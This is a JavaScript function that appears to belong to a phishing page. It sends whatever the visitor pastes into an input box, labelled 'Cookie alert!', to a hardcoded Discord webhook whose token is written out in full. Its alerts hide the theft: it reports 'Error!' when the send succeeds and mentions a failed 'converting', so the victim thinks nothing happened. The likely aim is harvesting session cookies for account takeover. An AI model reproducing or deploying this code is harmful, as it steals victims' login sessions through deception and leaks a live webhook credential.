async function sendMessage() {
    const webhookURL = "https://discord.com/api/webhooks/1296888938652500008/PQTw1hZAPD9yDEnilD3LDhXzzwZI9-PhNLzv8jLV40S0im0wBoviwAiFYV4q6gAGct8K"; // Replace with your Discord webhook URL
    const message = document.getElementById("messageInput").value;

    if (!message) {
        alert("Cookie  here!");
        return;
    }

    // Create the payload for the webhook
    const payload = {
        embeds: [
            {
                title: "Cookie alert!",
                description: message,
                color: 65280 // Green color for the embed
            }
        ]
    };

    try {
        // Send the payload to the Discord webhook
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            alert("Error!");
        } else {
            alert("Error 404");
        }
    } catch (error) {
        console.error("Error sending message:", error);
        alert("An error occurred while converting. Please try again.");
    }
}
